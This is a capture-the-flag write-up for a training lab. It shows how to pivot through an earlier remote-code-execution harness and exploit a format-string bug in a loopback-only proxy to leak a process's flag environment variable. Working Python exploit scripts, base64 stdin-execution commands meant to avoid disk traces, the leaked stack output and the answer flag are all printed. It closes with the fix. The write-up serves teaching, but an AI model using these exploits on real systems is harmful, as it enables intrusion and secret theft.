#### Challenge:

Hi Senior Researcher,

SALVOR is a security-oriented learning environment designed for curious minds and aspiring security professionals. It provides a hands-on space to explore cybersecurity concepts, investigate realistic scenarios, and sharpen practical skills through interactive challenges.

Your task is to gain experience.

Stay curious!

The starting point for your SALVOR journey is  http://intro.salvor.nren.tcc

---

#### Solution:

`'Bfr` = **Buffer** — a classic binary-exploitation chapter that chains off [Chapter 1 Act-er](../Chapter_1_Act-er/README.md). The flag lives in the environment of a second, **local-only** service co-located on the DSRepos host, and the only way to reach it is to pivot through the Act-er RCE.

**1. Pivot via Act-er RCE.** The DSRepos box (`dsrepos.salvor.nren.tcc`) is still owned through
CVE-2025-55182 (see Chapter 1). Using `../Chapter_1_Act-er/exploit_harness.py "<cmd>"` as a shell,
recon of listening sockets turns up a second service we didn't deploy, with its source sitting in
`/proxy`:

```bash
python3 ../Chapter_1_Act-er/exploit_harness.py "ss -ltnp; ls -laR /proxy"
```

```
LISTEN 0 128  *:3001  *:*          # a dual-stack listener, separate from Next.js on :3000
/proxy: Makefile  proxy-filter.conf  proxy.c  .build/proxy
```

`/etc/supervisor/conf.d/supervisord.conf` shows the layout — three flags, one per program:

```ini
[program:next]   user=dsrepos    FLAG="%(ENV_SALVOR_FLAG1)s"   # Chapter 1 (Act-er)
[program:proxy]  user=tlsproxy   FLAG="%(ENV_SALVOR_FLAG2)s"   # Chapter 2 (this one)
[program:sshd]   ...
```

So the target flag is `SALVOR_FLAG2`, held in the environment of the `/proxy/.build/proxy`
process running as **tlsproxy** on **:3001**.

**2. The vuln — a format-string bug in the "TLS proxy".** `/proxy/proxy.c` is a forking HTTP proxy
that relays to `127.0.0.1:3000` (the Next.js app). A request starting with `TRACE ` is handled
specially, and the attacker-controlled request buffer is passed **straight into `snprintf` as the
format string**:

```c
void process_trace_request(int client_fd, char *buffer) {
    ...
    int len = snprintf(response, BUFFER_SIZE, buffer);   // <-- buffer is the request
    send(client_fd, response, len, 0);
}
```

No fixed `"%s"` format — classic **CWE-134 format string**. Sending `TRACE %p %p ... %s` makes the
proxy walk its own stack and print memory back to us. The flag is an `env` string, which on Linux
sits near the top of the stack, reachable by direct-parameter access `%<n>$s`.

**3. Reachability — why the pivot is mandatory.** The proxy binds `[::]:3001` dual-stack but enforces
an allow-list (`proxy-filter.conf` + hardcoded loopback) in `is_client_allowed()`:

```
# proxy-filter.conf
127.0.0.1 / ::1 / ::ffff:127.0.0.1     # loopback
10.99.26.22  ...                        # ingress only
```

Our VPN host is not on that list, so `:3001` is unreachable from outside — every other source is
`DENIED`. But **127.0.0.1 is allowed**, and we already have code execution on the box as `dsrepos`,
so we hit the proxy from localhost.

**4. Confirm the leak and find the offset ([`scan.py`](./scan.py)).** Since `:3001` only accepts
loopback, we drive it from inside the box by `base64`-piping a small scanner to `python3 -` over the
RCE (stdin, so nothing lands on the box's disk). The scanner does two things, both exploiting the
fact that `snprintf(response, N, buffer)` treats our request as the *format string*:

- **`%p` sweep** — `%p.%p.%p…` tells `snprintf` to print successive `va_arg` slots as pointers. On
  x86/x86-64 varargs are pulled from registers then the stack, so this dumps the raw words the proxy
  reads just past the (missing) real arguments. If we get back live values — especially dwords that
  spell out our own request — the specifiers are genuinely being evaluated and the bug is real.
- **`%<n>$s` search** — *direct parameter access*: `%132$s` means "take the 132nd argument and
  print it as a C string (`char *`)". A process's environment strings sit on the stack as
  pointers-to-string, so by sweeping `n` and dereferencing each slot as a string we hunt for the one
  that points at the `FLAG=` env var. We mark every probe `M:<leak>:N` to carve the result cleanly,
  and only print the `n` whose dereference contains `FLAG`.

```python
# scan.py
import socket
def leak(fmt):
    s = socket.create_connection(("127.0.0.1", 3001)); s.settimeout(1)
    s.sendall(b"TRACE M:" + fmt + b":N\n")
    d = b""
    while True:
        try: c = s.recv(4096)
        except Exception: break
        if not c: break
        d += c
    s.close(); return d

print(leak(b"%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p").decode(errors="replace"))  # sweep
for n in range(120, 145):                                                     # find env
    d = leak(b"%%%d$s" % n)
    if b"FLAG" in d:
        print("offset", n, "->", d.split(b"M:", 1)[-1].rsplit(b":N", 1)[0].decode(errors="replace"))
```

```bash
B64=$(base64 -w0 scan.py)
# pipe to python3 over stdin — nothing is written to the box's disk
python3 ../Chapter_1_Act-er/exploit_harness.py "echo $B64 | base64 -d | python3 -"
```

```
=== %p sweep ===
TRACE M:0xff7fffc0.(nil).(nil).0x55c38e21b1c0.0x4f2251478.0x312e312f50545448.  ...  :N
=== %n$s search for FLAG ===
offset 132 -> FLAG=FLAG{LWoM-kzkO-YFUf-XGpm}
```

The sweep echoes raw stack dwords, and the one at `0x312e312f50545448` decodes little-endian as
`48 54 54 50 2f 31 2e 31` = `"HTTP/1.1"` — our own request buffer showing up in the proxy's stack
frame, which confirms the format string is live. The search then reports that direct-parameter
index **132** dereferences straight to the `FLAG=` environment string. (The exact offset depends on
the compiled frame layout — hence we brute a small range rather than hardcode it; `-O0` in the
Makefile keeps it stable.)

**5. Fire it.** With the offset known, we drop a one-shot probe `temp.py` and run it the same way —
this is our reusable exploit for the challenge:

```python
# temp.py
import socket

s = socket.create_connection(("127.0.0.1", 3001))
s.settimeout(1)

s.sendall(b"TRACE AAA:%132$s:BBB\n")

data = b""

while True:
    try:
        chunk = s.recv(4096)
    except (socket.timeout, ConnectionResetError):
        break

    if not chunk:
        break

    data += chunk

s.close()

print(data.decode(errors="replace"))
```

```bash
B64=$(base64 -w0 temp.py)
python3 ../Chapter_1_Act-er/exploit_harness.py "echo $B64 | base64 -d | python3 -"
```

```
HTTP/1.1 200 OK
Content-Type: text/plain
Connection: close

TRACE AAA:FLAG=FLAG{LWoM-kzkO-YFUf-XGpm}:BBB
```

The `%132$s` dereferenced the tlsproxy process's `FLAG` environment variable and reflected it into
the TRACE response — `SALVOR_FLAG2` recovered.

**Fix:** never pass untrusted input as a format string — `snprintf(response, BUFFER_SIZE, "%s", buffer)`.

---

<details><summary>FLAG:</summary>

```
FLAG{LWoM-kzkO-YFUf-XGpm}
```

</details>
<br/>
